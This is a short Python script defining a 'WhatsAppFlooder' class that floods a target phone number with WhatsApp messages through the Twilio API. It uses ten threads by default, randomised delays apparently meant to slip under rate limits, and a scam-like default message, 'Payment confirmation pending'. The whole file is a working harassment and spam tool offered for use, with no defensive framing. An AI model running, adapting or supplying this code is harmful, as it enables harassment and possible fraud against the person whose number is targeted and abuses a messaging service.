"""WhatsApp Business message flooding via Twilio WhatsApp API."""
from __future__ import annotations

import threading
import time
import random
import requests


class WhatsAppFlooder:
    def __init__(self, target: str, from_number: str = "whatsapp:+14155238886"):
        if not target.startswith("+"):
            raise ValueError("target must be E.164 like +919876543210")
        self.target = "whatsapp:" + target
        self.from_number = from_number
        self.stats = {"sent": 0, "failed": 0, "locked": False}
        self._lock = threading.Lock()

    def send(self, sid: str, token: str, body: str = "Payment confirmation pending") -> bool:
        url = f"https://api.twilio.com/2010-04-01/Accounts/{sid}/Messages.json"
        try:
            r = requests.post(url, auth=(sid, token), data={
                "To": self.target, "From": self.from_number, "Body": body,
            }, timeout=10)
            ok = r.status_code == 201
        except requests.RequestException:
            ok = False
        with self._lock:
            self.stats["sent" if ok else "failed"] += 1
        return ok

    def run(self, sid: str, token: str, workers: int = 10,
            duration: int = 30, delay: float = 1.0) -> dict:
        deadline = time.time() + duration
        def worker():
            while time.time() < deadline and not self.stats["locked"]:
                self.send(sid, token)
                time.sleep(delay + random.uniform(0, delay))
        ts = [threading.Thread(target=worker, daemon=True) for _ in range(workers)]
        for t in ts: t.start()
        for t in ts: t.join()
        return dict(self.stats)
